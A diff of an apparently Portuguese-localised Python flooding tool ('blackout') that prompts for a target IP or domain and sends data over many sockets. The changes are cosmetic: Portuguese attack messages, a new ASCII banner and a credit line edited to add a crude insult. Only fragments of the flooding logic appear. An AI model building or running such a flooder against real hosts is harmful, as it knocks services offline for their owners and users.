@@ -31,10 +31,10 @@ def blackout(ip, port, size, connections, finished_event):
         try:
             sock.send(data.encode())
             sock.send('\r\n\r\n'.encode())
-            print(f"Attacking {ip}:{port}")
+            print(f"Mandando chumbo em {ip}:{port}")
         except socket.error as e:
             errors += 1
-            print(f"[-] Error sending data to {ip}:{port}: {e}")
+            print(f"[-] Erro, se tá tudo certo {ip}:{port}: {e}")
 
     for sock in socks:
         sock.close()
@@ -55,15 +55,14 @@ def get_ip_or_domain(ip_or_domain):
 
 def main():
     print('''
-     _____         ____  _       _               
-    |  ___|__  _ _| __ )(_) __ _| | ___ _ __ ___ 
-    | |_ / _ \| '__|  _ \| |/ _` | |/ _ \ '__/ __|
-    |  _| (_) | |  | |_) | | (_| | |  __/ |  \__ \\
-    |_|  \___/|_|  |____/|_|\__, |_|\___|_|  |___/
-                           |___/                 
-    ''')
 
-    example_url = "Example: www.example.com or 93.184.216.34"
+    8P d8P 888'Y88 888 88e
+ P d8P  888 ,'Y 888 888b
+  d8P d 888C8   888 8888D
+ d8P d8 888 ",d 888 888P
+d8P d88 888,d88 888 88''')
+
+    example_url = "Exemplo: www.example.com ou 93.184.216.34"
 
     ip_or_domain = questionary.text(f"Enter the target IP address or domain ({example_url}):").ask()
     ip = get_ip_or_domain(ip_or_domain)
@@ -93,7 +92,7 @@ def main():
 
     # Exibe a mensagem de crédito após o término dos ataques
     finished_event.wait()
-    print("Créditos para o Zed Hacking pelo script de ataque!")
+    print("Créditos para o Zed Hacking, kiba não puta")
 
 if __name__ == "__main__":
     main()
